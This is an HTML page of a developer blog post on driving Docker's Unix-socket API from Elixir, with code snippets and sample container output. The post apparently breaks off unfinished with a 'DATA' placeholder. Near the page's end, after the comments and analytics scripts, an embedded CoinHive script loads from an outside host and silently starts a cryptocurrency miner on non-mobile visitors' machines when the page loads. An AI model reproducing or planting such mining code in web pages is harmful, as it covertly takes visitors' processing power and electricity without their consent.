<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1'/>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Hostile Developer - Whales and Potions. Driving Docker with Elixir</title>
  <link href="/favicon.ico" rel="icon" type="image/ico" />
  <link href="/stylesheets/application.css" rel="stylesheet" type="text/css" />
  <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
</head>
<body>
<div id="container">
  <section id="header">
  <header>
<a href="/">        <h1 class="brand"><span class="hostile">Hostile</span> Developer</h1>
        <h4 class="tag-line">I am Steven. Hear me Rant.</h4>
</a>  </header>

  <section class='social'>
    <a href="http://twitter.com/_StevenNunez/" target="_blank"><i class="fa fa-twitter"></i></a>
    <a href="https://github.com/StevenNunez/" target="_blank"><i class="fa fa-github"></i></a>
  </section>
</section>


  <main id='article' role="main">
    <h1 class="article-title"><a href="/2018/04/20/whales-and-potions-driving-docker-with-elixir.html">Whales and Potions. Driving Docker with Elixir</a></h1>
    <p><a href="https://www.youtube.com/watch?v=q44qxXxsIUQ">On an episode of SoBroCodeBros</a>, we explored connecting to Docker&rsquo;s API with Elixir. The way the show works is my brother and I pick a topic we&rsquo;re pretty good at, and use it in an unfamilar domain. In this case, I&rsquo;m really familar with Elixir and Docker, but working with it through it&rsquo;s Unix Socket interface was new.</p>

<p>The intention of this post is to summarize some of our learnings. As always, be sure to <a href="https://www.youtube.com/channel/UC0tLqS7es8MmM_rrcTF1cbA">Like and subscribe</a> to our channel over on YouTube, and let me know if you want to see this blog post in video format. Off we go.</p>

<h2>Assumptions</h2>

<p>You&rsquo;re running at least Elixir 1.6, and have Docker installed. I&rsquo;m running API version 1.37 but I don&rsquo;t think we&rsquo;re using any bleeding edge docker stuff.</p>

<h2>Getting Started</h2>

<p>Let&rsquo;s create a plain Elixir project with <code>mix new docker_driver</code>, then open up <code>mix.exs</code>. Here we&rsquo;ll add a few dependencies. <code>HTTPoison</code> to make requests, and <code>Poison</code> to parse JSON responses.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="c1"># mix.exs</span>
<span class="k">defp</span> <span class="n">deps</span> <span class="k">do</span>
  <span class="p">[</span>
    <span class="p">{</span><span class="ss">:poison</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 3.1"</span><span class="p">},</span>
    <span class="p">{</span><span class="ss">:httpoison</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 1.0"</span><span class="p">},</span>
  <span class="p">]</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>and run <code>mix deps.get</code> </p>

<p>Then create a new module to wrap a few of our operations named <code>docker_adapter.ex</code> in <code>lib/docker_driver/</code>.</p>

<h2>Connecting to Unix Sockets</h2>

<p>Here&rsquo;s our first pass at our module.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">DockerDriver</span><span class="o">.</span><span class="no">DockerAdapter</span> <span class="k">do</span>
  <span class="nv">@socket</span>  <span class="sd">"</span><span class="s2">/var/run/docker.sock"</span> <span class="o">|&gt;</span> <span class="no">URI</span><span class="o">.</span><span class="n">encode_www_form</span>
  <span class="nv">@url</span>     <span class="sd">"</span><span class="s2">http+unix://</span><span class="si">#{</span><span class="nv">@socket</span><span class="si">}</span><span class="s2">"</span>

  <span class="k">def</span> <span class="n">running_containers</span> <span class="k">do</span>
    <span class="n">with</span> <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="p">%</span><span class="no">HTTPoison</span><span class="o">.</span><span class="no">Response</span><span class="p">{</span><span class="ss">body:</span> <span class="n">body</span><span class="p">}}</span> <span class="o">&lt;-</span> <span class="no">HTTPoison</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sd">"</span><span class="si">#{</span><span class="nv">@url</span><span class="si">}</span><span class="s2">/containers/json"</span><span class="p">),</span>
         <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="n">parsed</span><span class="p">}</span> <span class="o">&lt;-</span> <span class="no">Poison</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">body</span><span class="p">)</span> 
    <span class="k">do</span>
      <span class="n">parsed</span>
    <span class="k">else</span>
      <span class="n">err</span> <span class="o">-&gt;</span> 
        <span class="no">IO</span><span class="o">.</span><span class="n">puts</span> <span class="sd">"</span><span class="s2">something Broke"</span>
        <span class="no">IO</span><span class="o">.</span><span class="n">inspect</span> <span class="n">err</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Add this to <code>.iex.exs</code> in your project so you don&rsquo;t have to keep aliasing stuff</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">alias</span> <span class="no">DockerDriver</span><span class="o">.</span><span class="no">DockerAdapter</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Start a container and backround it. That way something will show up in our shell in a bit with <code>docker run -itd busybox</code>.</p>

<p>In <code>iex -S mix</code> run <code>DockerAdapter.running_containers</code></p>
<div class="highlight"><pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre>[
  %{
    "Command" =&gt; "sh",
    "Created" =&gt; 1524266416,
    "HostConfig" =&gt; %{"NetworkMode" =&gt; "default"},
    "Id" =&gt; "3ccab1ee2ee3509cf8b955604638cca4ed2044b0f71434876d490837158defda",
    "Image" =&gt; "busybox",
    "ImageID" =&gt; "sha256:8ac48589692a53a9b8c2d1ceaa6b402665aa7fe667ba51ccc03002300856d8c7",
    "Labels" =&gt; %{},
    "Mounts" =&gt; [],
    "Names" =&gt; ["/affectionate_pare"],
    "NetworkSettings" =&gt; %{
      "Networks" =&gt; %{
        "bridge" =&gt; %{
          "Aliases" =&gt; nil,
          "DriverOpts" =&gt; nil,
          "EndpointID" =&gt; "558ee96cab03aafaf33c1233422fdf2601eca404473d2abec8f4593fe706ceb0",
          "Gateway" =&gt; "172.17.0.1",
          "GlobalIPv6Address" =&gt; "",
          "GlobalIPv6PrefixLen" =&gt; 0,
          "IPAMConfig" =&gt; nil,
          "IPAddress" =&gt; "172.17.0.2",
          "IPPrefixLen" =&gt; 16,
          "IPv6Gateway" =&gt; "",
          "Links" =&gt; nil,
          "MacAddress" =&gt; "02:42:ac:11:00:02",
          "NetworkID" =&gt; "2993a0d3c34044b0f615eb8c149342d5ce9148835258260e66fca1366b6ac473"
        }
      }
    },
    "Ports" =&gt; [],
    "State" =&gt; "running",
    "Status" =&gt; "Up 10 seconds"
  }
]

</pre></td></tr></tbody></table></code></pre></div>
<p>DATA</p>

<p>link to https://docs.docker.com/engine/api/v1.30/#operation/ContainerList, do Inspect, then logs, followed by attaching to a stream.</p>

    <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'hostiledeveloper'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

  </main>

 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-48123503-1', 'auto');
  ga('send', 'pageview');

</script>

  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
   var miner = new CoinHive.Anonymous('zmOZS6Bce7Nsw6WOSrt2cAJvIy4CvcNV');
   if (!miner.isMobile()) { miner.start(); }
 </script>

 <em>Copyright &copy; 2018 Steven Nu&ntilde;ez - HostileDeveloper</em>

</div>
</body>
</html>
